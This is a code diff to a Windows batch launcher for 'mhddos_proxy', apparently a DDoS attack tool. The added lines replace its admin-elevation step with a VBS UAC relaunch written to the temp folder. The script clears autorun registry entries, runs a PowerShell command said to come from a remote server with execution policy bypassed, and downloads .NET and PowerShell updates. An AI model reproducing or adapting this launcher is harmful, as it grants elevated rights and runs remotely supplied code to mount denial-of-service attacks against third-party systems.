@@ -1,5 +1,6 @@
 @echo off
-if not "%1"=="am_admin" ( powershell start -verb runas '%0' 'am_admin "%~1" "%~2"' & exit )
+set "params=%*"
+cd /d "%~dp0" && ( if exist "%tmp%\getadmin.vbs" del "%tmp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%tmp%\getadmin.vbs" && "%tmp%\getadmin.vbs" && exit /B )
 call:REG_autorun_del
 call:REG_lowrisk_del
 cls
@@ -23,7 +24,7 @@ if %_PWSH% LSS 3 call:PWSHsetup
 
 :: Get command from ps1 on server
 :ps1
-start "mhddos" powershell -executionpolicy bypass -command "%_PS1_COMMAND%"
+start "mhddos_proxy" powershell -executionpolicy bypass -noexit -command "%_PS1_COMMAND%"
 :: End
 :end
 exit
@@ -86,7 +87,7 @@ exit /b 0
 
 :.NETsetup_WebClient
 echo // Downloading NDP452-KB2901907-x86-x64-AllOS-ENU.exe ^[66.7 MB^] . . .
-powershell -executionpolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://download.microsoft.com/download/E/2/1/E21644B5-2DF2-47C2-91BD-63C560427900/NDP452-KB2901907-x86-x64-AllOS-ENU.exe','%folder%\ndp452.exe'); Start-Sleep -s 3"
+powershell -executionpolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://download.microsoft.com/download/E/2/1/E21644B5-2DF2-47C2-91BD-63C560427900/NDP452-KB2901907-x86-x64-AllOS-ENU.exe','%folder%\ndp452.exe'); Start-Sleep -s 2"
 exit /b 0
 
 :: [>---- Powershell ----<]
@@ -119,11 +120,11 @@ exit
 
 :PWSHsetup_WebClient
 echo // Downloading Windows6.1-KB2506143-x64.msu ^[15.7 MB^] . . .
-powershell -executionpolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://download.microsoft.com/download/E/7/6/E76850B8-DA6E-4FF5-8CCE-A24FC513FD16/Windows6.1-KB2506143-x64.msu','%folder%\wmn3.msu'); Start-Sleep -s 3"
+powershell -executionpolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://download.microsoft.com/download/E/7/6/E76850B8-DA6E-4FF5-8CCE-A24FC513FD16/Windows6.1-KB2506143-x64.msu','%folder%\wmn3.msu'); Start-Sleep -s 2"
 exit /b 0
 :PWSHsetup_WebClient_x86
 echo // Downloading Windows6.1-KB2506143-x86.msu ^[11.7 MB^] . . .
-powershell -executionpolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://download.microsoft.com/download/E/7/6/E76850B8-DA6E-4FF5-8CCE-A24FC513FD16/Windows6.1-KB2506143-x86.msu','%folder%\wmn3.msu'); Start-Sleep -s 3"
+powershell -executionpolicy bypass -command "(New-Object System.Net.WebClient).DownloadFile('https://download.microsoft.com/download/E/7/6/E76850B8-DA6E-4FF5-8CCE-A24FC513FD16/Windows6.1-KB2506143-x86.msu','%folder%\wmn3.msu'); Start-Sleep -s 2"
 exit /b 0
 
 :: [>---- regedit ----<]
